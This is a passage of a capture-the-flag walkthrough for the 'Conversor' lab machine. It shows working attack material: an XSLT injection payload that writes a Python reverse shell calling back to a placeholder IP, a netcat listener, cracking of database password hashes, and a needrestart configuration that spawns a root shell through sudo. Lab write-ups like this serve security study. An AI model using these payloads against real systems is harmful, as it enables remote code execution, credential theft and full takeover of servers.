2. Source Code Analysis
By examining the provided source_code.tar.gz, I identified a Flask-based application. The file structure revealed:

app.py: The core application logic.

instance/users.db: A SQLite database containing user credentials.

static/nmap.xslt: An XSL template used for processing data.

The application takes XML input and processes it using XSLT. This is a classic entry point for XSLT Injection.

3. Exploitation (XSLT Injection to RCE)
Since the XSLT processor allows extensions, we can use the exploit:document function to write a malicious Python script directly into the server's script directory.

Step 1: Create the Malicious XSLT
This payload writes a reverse shell script named shell.py into the web directory.

<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="[http://www.w3.org/1999/XSL/Transform](http://www.w3.org/1999/XSL/Transform)" 
                xmlns:exploit="[http://exslt.org/common](http://exslt.org/common)" 
                extension-element-prefixes="exploit" 
                version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("YOUR_HTB_VPN_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/sh")
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>

Step 2: Trigger the Execution
Start a netcat listener on your local machine:

nc -lnvp 4444

Upload the crafted XML/XSLT. Once the server processes it, the shell is written and executed, granting us a reverse shell.

4. Lateral Movement (fismathack)
The reverse shell gives us limited access as the web user. To move to a real user, we check instance/users.db.

Dump Database: Extract hashes from the users table.

Crack Hash: Found user fismathack. The password hash was cracked via CrackStation (MD5).

SSH Access:
ssh fismathack@conversor.htb

User Flag: 27eb... (captured) ✅


5. Privilege Escalation (Root)
Checking for sudo permissions and system configurations, I found needrestart was present. This version is vulnerable to a local privilege escalation.

The Exploit
We create a custom configuration file that forces needrestart to execute a bash shell with root privileges.

# Clean up any old exploit files
rm -rf /tmp/exploit.conf 

# Create the malicious config
cat > /tmp/exploit.conf << 'EOF'
$nrconf{restart} = 'a';
exec("/bin/bash -p");
EOF

# Trigger the exploit
sudo /usr/sbin/needrestart -c /tmp/exploit.conf

Successfully escalated to root!

Root Flag: 2727eb..................3753cf30 ✅

